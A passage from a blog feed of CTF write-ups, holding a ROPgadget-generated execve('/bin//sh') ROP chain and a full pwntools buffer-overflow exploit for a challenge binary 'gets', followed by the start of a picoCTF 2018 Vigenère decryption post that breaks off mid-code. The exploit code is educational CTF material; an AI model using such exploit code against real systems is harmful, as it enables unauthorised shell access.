<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/ROPgadget/ROPgadget.py --binary ./gets --ropchain &gt; rop_output.txt
tail -40 rop_output.txt
	<span style="color:#6272a4"># execve generated by ROPgadget</span>

	from struct import pack

	<span style="color:#6272a4"># Padding goes here</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>

	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0806f19a<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop edx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea060<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080b84d6<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;/bin&#39;</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x08054b4b<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0806f19a<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop edx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea064<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data + 4</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080b84d6<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;//sh&#39;</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x08054b4b<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0806f19a<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop edx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea068<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data + 8</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x08049473<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># xor eax, eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x08054b4b<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080481c9<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop ebx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea060<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080dece1<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop ecx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea068<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data + 8</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0806f19a<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># pop edx ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x080ea068<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># @ .data + 8</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x08049473<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># xor eax, eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0807ab7f<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># inc eax ; ret</span>
	<span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">+=</span> pack<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, 0x0806cd95<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># int 0x80</span>
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> struct
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_offset</span>(eip):
    <span style="color:#6272a4">#print cyclic(150)</span>
    eip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;aaah&#39;</span>    <span style="color:#6272a4">#obtain with dmesg | tail -1</span>
    eip <span style="color:#ff79c6">=</span> eip[::<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#6272a4">#reverse the eip bicause of little endianness</span>
    <span style="color:#ff79c6">return</span> cyclic_find(eip)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_rop</span>(offset):
        <span style="color:#6272a4"># Padding goes here</span>
        p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>

        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0806f19a</span>) <span style="color:#6272a4"># pop edx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea060</span>) <span style="color:#6272a4"># @ .data</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080b84d6</span>) <span style="color:#6272a4"># pop eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;/bin&#39;</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x08054b4b</span>) <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0806f19a</span>) <span style="color:#6272a4"># pop edx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea064</span>) <span style="color:#6272a4"># @ .data + 4</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080b84d6</span>) <span style="color:#6272a4"># pop eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;//sh&#39;</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x08054b4b</span>) <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0806f19a</span>) <span style="color:#6272a4"># pop edx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea068</span>) <span style="color:#6272a4"># @ .data + 8</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x08049473</span>) <span style="color:#6272a4"># xor eax, eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x08054b4b</span>) <span style="color:#6272a4"># mov dword ptr [edx], eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080481c9</span>) <span style="color:#6272a4"># pop ebx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea060</span>) <span style="color:#6272a4"># @ .data</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080dece1</span>) <span style="color:#6272a4"># pop ecx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea068</span>) <span style="color:#6272a4"># @ .data + 8</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0806f19a</span>) <span style="color:#6272a4"># pop edx ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x080ea068</span>) <span style="color:#6272a4"># @ .data + 8</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x08049473</span>) <span style="color:#6272a4"># xor eax, eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0807ab7f</span>) <span style="color:#6272a4"># inc eax ; ret</span>
        p <span style="color:#ff79c6">+=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0806cd95</span>) <span style="color:#6272a4"># int 0x80</span>

        <span style="color:#ff79c6">return</span> fit({offset : p})

offset <span style="color:#ff79c6">=</span> get_offset(eip)
<span style="color:#8be9fd;font-style:italic">print</span> offset
ropchain <span style="color:#ff79c6">=</span> get_rop(offset)

p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./gets&#39;</span>)
p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;GIVE ME YOUR NAME!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ropchain)
p<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id="freecalc">freecalc</h2>
<h2 id="sword">sword</h2>
<h2 id="contacts">Contacts</h2>
]]></content></item><item><title>picoCTF 2018 - Cryptography</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-cryptography/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-cryptography/</guid><description>Crypto-warmup-1 The fastest way is pip install pycipher
1 2 3 4 5 6 7 8 pip install pycipher python2 &amp;gt;&amp;gt;&amp;gt; c = &amp;#39;llkjmlmpadkkc&amp;#39;.upper() &amp;gt;&amp;gt;&amp;gt; k = &amp;#39;thisisalilkey&amp;#39;.upper() &amp;gt;&amp;gt;&amp;gt; from pycipher import Vigenere &amp;gt;&amp;gt;&amp;gt; plaintext = Vigenere(k).decipher(c) &amp;gt;&amp;gt;&amp;gt; print plaintext SECRETMESSAGE We can also code ourselves but it takes a bit more time ;)
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #!</description><content type="html"><![CDATA[<h2 id="crypto-warmup-1">Crypto-warmup-1</h2>
<p>The fastest way is <code>pip install pycipher</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pip install pycipher
python2
<span style="color:#ff79c6">&gt;&gt;&gt;</span> c <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;llkjmlmpadkkc&#39;</span><span style="color:#ff79c6">.</span>upper()
<span style="color:#ff79c6">&gt;&gt;&gt;</span> k <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;thisisalilkey&#39;</span><span style="color:#ff79c6">.</span>upper()
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> pycipher <span style="color:#ff79c6">import</span> Vigenere
<span style="color:#ff79c6">&gt;&gt;&gt;</span> plaintext <span style="color:#ff79c6">=</span> Vigenere(k)<span style="color:#ff79c6">.</span>decipher(c)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">print</span> plaintext
SECRETMESSAGE
</code></pre></td></tr></table>
</div>
</div><p>We can also code ourselves but it takes a bit more time ;)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
